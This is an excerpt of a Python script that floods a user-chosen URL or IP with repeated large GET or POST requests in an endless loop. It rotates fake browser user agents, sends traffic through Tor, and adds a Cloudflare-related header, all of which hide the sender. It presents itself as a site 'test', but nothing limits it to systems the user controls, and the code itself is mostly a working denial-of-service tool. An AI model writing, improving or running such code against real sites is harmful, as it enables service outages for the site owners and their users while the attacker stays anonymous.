...
user_agents = [
    ...
    "Mozilla/5.0 (Linux; Android 10; SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Edge/99.0.9999.99",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 QQBrowser/9.5.10548.400",
...
def is_tor_installed():
    try:
        subprocess.run(["tor", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return True
...
def send_large_request(host, port, method='GET', payload_size_mb=1, use_warp=False):
    ...
    try:
        ...
        large_payload = 'A' * (payload_size_mb * 1024 * 1024)  # Default payload for GET requests

        if use_warp:
            headers['CF-Connecting-IP'] = 'true'

        if method == 'GET':
            response = requests.get(host, headers=headers, verify=False)
        elif method == 'POST':
            response = requests.post(host, headers=headers, data=large_payload, verify=False)
        else:
            print("Invalid HTTP method. Supported methods are 'GET' and 'POST'.")
            return

        if use_warp:
            print(f"Cloudflare Warp Status Code: {response.status_code}")
        elif is_tor_installed():
            session = requests.Session()
            session.proxies.update(tor_proxy)
            response = session.request(method, host, headers=headers, data=large_payload, verify=False)
            print(f"Tor Status Code: {response.status_code}")
        else:
            print("Tor is not installed. Skipping Tor request.")

    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e} for {host}")


def send_requests_with_interval(host, port, method='GET', payload_size_mb=1, interval=2, num_devices=4, use_warp=False):
    while True:
        for _ in range(num_devices):
            send_large_request(host, port, method, payload_size_mb, use_warp)
        time.sleep(interval)

if __name__ == "__main__":
    ensure_tor_installed()

    host_or_url = input("Enter the site URL or IP address to test (e.g., https://example.com or 192.168.1.1):\n==> ")

    use_warp_input = input("Do you want to use Cloudflare Warp? Enter '1' for Yes, '2' for No, or '3' for Direct:\n==> ")
    use_warp = use_warp_input == "1"

    while True:
        try:
            port = int(input("Enter the port to use for the request (default is 80):\n==> ") or 80)
            if 1 <= port <= 65535:
                break
            else:
                print("Port must be a positive integer between 1 and 65535.")
        except ValueError:
            print("Invalid input for the port. Please enter a valid port number.")

    method = input("Choose the HTTP method: '1' for GET or '2' for POST (default is GET):\n==> ")
    if method == "1":
        method = 'GET'
    elif method == "2":
        method = 'POST'
    ...
    while True:
        try:
            payload_size_mb = int(input("Enter the payload size in megabytes (MB) (default is 1 MB):\n==> ") or 1)
            if payload_size_mb > 0:
                break
            else:
                print("Payload size must be a positive integer.")
        except ValueError:
            print("Invalid input for the payload size.")

    while True:
        try:
            num_devices = int(input("Enter the number of devices (threads) to simulate (default is 4):\n==> ") or 4)
            if num_devices > 0:
                break
            else:
                print("Number of devices must be a positive integer.")
        except ValueError:
            print("Invalid input for the number of devices.")

    url = host_or_url

    if use_warp:
        print("Using Cloudflare Warp...")
    else:
        print("Not using Cloudflare Warp...")

    send_requests_with_interval(url, port, method, payload_size_mb, num_devices=num_devices, use_warp=use_warp)
